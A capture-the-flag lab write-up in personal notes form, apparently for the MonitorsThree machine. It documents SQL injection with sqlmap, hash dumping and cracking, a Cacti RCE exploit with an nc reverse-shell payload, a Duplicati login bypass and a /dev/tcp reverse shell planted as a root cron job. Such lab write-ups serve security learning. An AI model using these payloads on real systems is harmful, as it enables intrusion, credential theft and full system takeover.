

## Lab Details
- Difficulty: Medium
- OS: Linux

## Summary
- Initial access:
- Privilege escalation:

## Enumeration
#### Steps
- run `nmap`
```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold

#### Steps
- Enumerate subdomains, identified `cacti` subdomain
```
$ ffuf -u "http://10.129.231.115" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.monitorsthree.htb"  -fs 13560
<SNIP>
cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
```
- Enumerate endpoints and identified `forgot_password.php`
```
$ ffuf -u http://monitorsthree.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -ic -e .php

<SNIP>
index.php               [Status: 200, Size: 13560, Words: 3598, Lines: 338, Duration: 7ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 8ms]
login.php               [Status: 200, Size: 4252, Words: 1342, Lines: 97, Duration: 5ms]
admin                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 9ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 4ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 5ms]
forgot_password.php     [Status: 200, Size: 3030, Words: 178, Lines: 86, Duration: 4ms]
```
- Test with SQLi using SQLMap
- Capture and save a request using `burpsuite`
```
$ cat reset_password.post 
POST /forgot_password.php HTTP/1.1
Host: monitorsthree.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://monitorsthree.htb/forgot_password.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://monitorsthree.htb
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=9h6nq3vtttft1umi6momhudsu7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=
```
- Use `sqlmap` to test
```
$ sqlmap -r reset_password.post --risk 3 --level 5 --batch
<SNIP>
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 3767 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=';SELECT SLEEP(5)#
---
[01:44:15] [INFO] the back-end DBMS is MySQL
[01:44:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:44:40] [INFO] fetched data logged to text files under '/home/ch4os1/.local/share/sqlmap/output/monitorsthree.htb'
[01:44:40] [WARNING] your sqlmap version is outdated

[*] ending @ 01:44:40 /2026-06-03/
```
- There is a SQLi vulnerability 
- Fetch the databases
```
$ sqlmap -r reset_password.post --risk 3 --level 5 --batch --dbs
<SNIP>
available databases [2]:
[*] information_schema
[*] monitorsthree_db
```
- Fetch the tables in `monitorsthree_db` database
```
$ sqlmap -r reset_password.post --risk 3 --level 5 --batch -D monitorsthree_db --tables
<SNIP>
Database: monitorsthree_db
[6 tables]
+---------------+
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
| users         |
+---------------+
```
- Found users and their hashes
```
$ sqlmap -r reset_password.post --risk 3 --level 5 --batch -D monitorsthree_db -T users --dump
+----+-----------------------------+----------------------------------+ | id | email | password | <...SNIP...> +----+-----------------------------+----------------------------------+ | 2 | admin@monitorsthree.htb | 31a181c8372e3afc59dab863430610e8 | | 5 | mwatson@monitorsthree.htb | c585d01f2eb3e6e1073e92023088a3dd | | 6 | janderson@monitorsthree.htb | 1e68b6eb86b45f6d92f8f292428f77ac | | 7 | dthompson@monitorsthree.htb | 633b683cc128fe244b00f176c8a950f5 | +----+-----------------------------+----------------------------------+
```
- Cracked the admin hash using hashcat
```
$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
31a181c8372e3afc59dab863430610e8:greencacti2001
```
- Login to `cacti.monitorsthree.htb` with `admin : greencacti2001`
- Search online and found Authenticated RCE [https://github.com/D3Ext/CVE-2024-25641](https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26)
- Download the exploit and run it against the target
```
$ git clone https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26.git $ && cd CVE-2024-25641-CACTI-RCE-1.2.26
$ pip install -r requirements.txt
### run the exploit
$ python3 CVE-2024-25641.py http://cacti.monitorsthree.htb/cacti/ --user admin --pass greencacti2001 -x 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 4444 >/tmp/f'
```
- Receive a shell back as user `www-data`
```
$ nc -lvnp 4444
```
## Lateral Movement 

#### Steps
- Load and run `linpeas.sh`
- Found database credentials
```
-rw-r--r-- 1 www-data www-data 6955 May 18  2024 /var/www/html/cacti/include/config.php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';

```
- Login to mysql using the found credential 
```
www-data@monitorsthree:/tmp$ mysql -u cactiuser -pcactiuser
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 50336
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
```
- Enumerate the databases and found table `user_auth`
```
MariaDB [cacti]> show tables;
| user_auth                           |
```
- Dump the table and found user credentials 
```
MariaDB [cacti]> select * from user_auth\G;
*************************** 1. row ***************************
                    id: 1
              username: admin
              password: $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G
                 realm: 0
             full_name: Administrator
         email_address: marcus@monitorsthree.htb
  must_change_password: 
       password_change: 
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 2
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 436423766
*************************** 2. row ***************************
                    id: 3
              username: guest
              password: $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu
                 realm: 0
             full_name: Guest Account
         email_address: guest@monitorsthree.htb
  must_change_password: 
       password_change: 
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: 
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: 
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 3774379591
*************************** 3. row ***************************
                    id: 4
              username: marcus
              password: $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
                 realm: 0
             full_name: Marcus
         email_address: marcus@monitorsthree.htb
  must_change_password: 
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: 
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 1677427318
3 rows in set (0.000 sec)

ERROR: No query specified

```
- Use hashcat to decrypt and recovered user `marcus` plaintext password
```
$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
<SNIP>
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```
## Privilege Escalation

#### Steps
- From `linpeas` output it has identified `duplicati` which is a backup application 
```
╔══════════╣ Unexpected in /opt (usually empty) (T1083)
total 24
drwxr-xr-x  5 root root 4096 Aug 18  2024 .
drwxr-xr-x 18 root root 4096 Aug 19  2024 ..
drwxr-xr-x  3 root root 4096 May 20  2024 backups
drwx--x--x  4 root root 4096 May 20  2024 containerd
-rw-r--r--  1 root root  318 May 26  2024 docker-compose.yml
drwxr-xr-x  3 root root 4096 Aug 18  2024 duplicati
```
- `duplicati` is running on docker container on port 8200 
```
www-data@monitorsthree:/opt$ cat docker-compose.yml 
version: "3"

services:
  duplicati:
    image: lscr.io/linuxserver/duplicati:latest
    container_name: duplicati
    environment:
      - PUID=0
      - PGID=0
      - TZ=Etc/UTC
    volumes:
      - /opt/duplicati/config:/config
      - /:/source
    ports:
      - 127.0.0.1:8200:8200
    restart: unless-stopped
```
- Enumerate further and we found sqlite files from `duplicati`
```
www-data@monitorsthree:/opt/duplicati/config$ ls
CTADPNHLTC.sqlite  Duplicati-server.sqlite  control_dir_v2
```
- Searched online and found an article on bypassing the login of `duplicati`
https://read.martiandefense.org/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee
- Following the steps we first need to obtain the server-passphrase from the `Duplicati-server.sqlite` file
- Download it to local 
```
$ nc -lvnp 9000 > ./Duplicati-server.sqlite
```

```
$ nc 10.10.14.17 9000 < ./Duplicati-server.sqlite
```
- Open the sqlite file up using sqlite-browser
![[Pasted image 20260603170116.png]]
- Go to table `option` and scroll down we find the server-passphrase
- Move `chisel` to target to perform port foward
```
## target
$ chisel client 10.10.14.17:8001 R:8200:127.0.0.1:8200

## host
$ ./chisel server -p 8001 --reverse
```
- Access `duplicati` locally prompts password
![[Pasted image 20260603170053.png]]
- Capture the login attempt and respond to the login request, right click on the login request and click on respond to the request
![[Pasted image 20260603170638.png]]
- We can see the `nonce` value of the login 
```
{
  "Status": "OK",
  "Nonce": "SrKuJUlh3uniV24boGk0evBmOdkNCof/SGotPzf2ETI=",
  "Salt": "xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I="
}
```
- We can use it to craft a pass phrase along with the server-passphrase from the server sqlite file
```
## server-passphrase
Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
## server-passphrase-salt
xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
```
- First go to cyber chef and paste in the server-passphrase then `from base64` + `to hex` copy the value
![[Pasted image 20260603170900.png]]
```
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```
- Then in developer console replace the two values 
```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('SrKuJUlh3uniV24boGk0evBmOdkNCof/SGotPzf2ETI=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
```
![[Pasted image 20260603171154.png]]
- We get the pass phrase 
```
R6/fV9DYtwCPFIQcN/oJCq2o87muUUvsHBUHX3U8A0w=
```
- Capture the login request again and replace `login=` parameter with the final value
![[Pasted image 20260603171352.png]]
- We are presented with the home page of `duplicati`
- To get a reverse shell first we need to create a file in `marcus`'s home directory as per below which creates an cronjob entry then we create a backup and restore it, setting the restore to cron
```
echo '* * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.17/6000 0>&1"' > /home/marcus/rce
```
- Follow below to create a new backup
![[Pasted image 20260603172501.png]]


![[Pasted image 20260603174119.png]]
![[Pasted image 20260603174143.png]]
- Computer -> Source -> Home -> Marcus
![[Pasted image 20260603174215.png]]

![[Pasted image 20260603174224.png]]
![[Pasted image 20260603174233.png]]
- Go to home and click on run now 
![[Pasted image 20260603174244.png]]

![[Pasted image 20260603174307.png]]
![[Pasted image 20260603174337.png]]
- We set the path to restore to as /source/etc/cron.d
- Click on restore and wait for some time and a reverse shell will received as root
```
$ nc -lvnp 6000
Listening on 0.0.0.0 6000
Connection received on 10.129.231.115 49938
bash: cannot set terminal process group (47330): Inappropriate ioctl for device
bash: no job control in this shell
root@monitorsthree:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
## Lessons Learned
- Attack family:
	- Learned Privilege Escalation via Duplicati
- Key takeaway:

## Resources
- References: